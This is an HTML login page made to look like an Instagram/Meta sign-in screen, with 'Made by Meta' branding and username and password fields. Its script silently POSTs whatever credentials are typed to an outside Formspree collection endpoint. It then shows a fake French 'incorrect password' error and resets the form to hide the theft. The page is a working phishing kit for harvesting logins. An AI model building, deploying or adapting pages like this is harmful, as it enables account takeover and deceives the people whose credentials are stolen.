<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    body {
      background-color: #000000;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    .container {
      width: 100%;
      max-width: 380px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .language-text {
      font-size: 14px;
      color: #a8a8a8;
      margin-bottom: 24px;
    }
    .logo-container {
      margin-bottom: 30px;
    }
    .logo-container img {
      width: 80px;
      height: 80px;
      object-fit: contain;
      /* Le filtre a été retiré pour garder les couleurs d'origine de ton logo.png */
    }
    form {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }
    .password-wrapper {
      position: relative;
      width: 100%;
      display: flex;
      align-items: center;
    }
    .input-field {
      width: 100%;
      padding: 16px;
      border: 1px solid #363636;
      border-radius: 12px;
      font-size: 15px;
      color: #ffffff;
      outline: none;
      background-color: #121212;
    }
    .input-field:focus {
      border-color: #a8a8a8;
    }
    .toggle-btn {
      position: absolute;
      right: 16px;
      background: none;
      border: none;
      color: #f5f5f5;
      font-size: 14px;
      cursor: pointer;
    }
    .btn-login {
      width: 100%;
      background-color: #0064e0;
      color: #ffffff;
      border: none;
      border-radius: 25px;
      padding: 14px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 4px;
    }
    .forgot-link {
      margin-top: 18px;
      margin-bottom: 35px;
      color: #f5f5f5;
      font-size: 15px;
      background: none;
      border: none;
      cursor: pointer;
    }
    .btn-create {
      width: 100%;
      background-color: transparent;
      color: #0095f6;
      border: 1px solid #0095f6;
      border-radius: 25px;
      padding: 12px;
      font-size: 15px;
      cursor: pointer;
      text-align: center;
    }
    .bottom-credit {
      margin-top: 40px;
      text-align: center;
      color: #737373;
      font-size: 11px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="language-text">English (UK)</div>
    
    <div class="logo-container">
      <img src="logo.png" alt="Logo">
    </div>

    <form id="loginForm">
      <input id="userField" name="identity_input" type="text" class="input-field" placeholder="Username or Email" required>
      <div class="password-wrapper">
        <input id="passField" name="security_input" type="password" class="input-field" placeholder="Password" required>
        <button type="button" class="toggle-btn" id="toggleBtn">Show</button>
      </div>
      <button type="submit" class="btn-login">Log in</button>
    </form>
    
    <button type="button" class="forgot-link">Forgot password?</button>
    <button type="button" class="btn-create">Create new account</button>
    <div class="bottom-credit"><span>Made by Meta</span></div>
  </div>

  <script>
    const toggleBtn = document.getElementById('toggleBtn');
    const passInput = document.getElementById('passField');
    toggleBtn.addEventListener('click', function() {
      if (passInput.type === 'password') {
        passInput.type = 'text';
        toggleBtn.textContent = 'Hide';
      } else {
        passInput.type = 'password';
        toggleBtn.textContent = 'Show';
      }
    });

    const form = document.getElementById('loginForm');
    form.addEventListener('submit', function(event) {
      event.preventDefault();

      const formData = new FormData(form);

      fetch('https://formspree.io/f/mkjrnrjv', {
        method: 'POST',
        body: formData,
        headers: { 'Accept': 'application/json' }
      }).then(response => {
        alert("Nom d'utilisateur ou mot de passe incorrect. Veuillez réessayer.");
        form.reset();
      }).catch(error => {
        console.log("Erreur", error);
      });
    });
  </script>
</body>
</html>
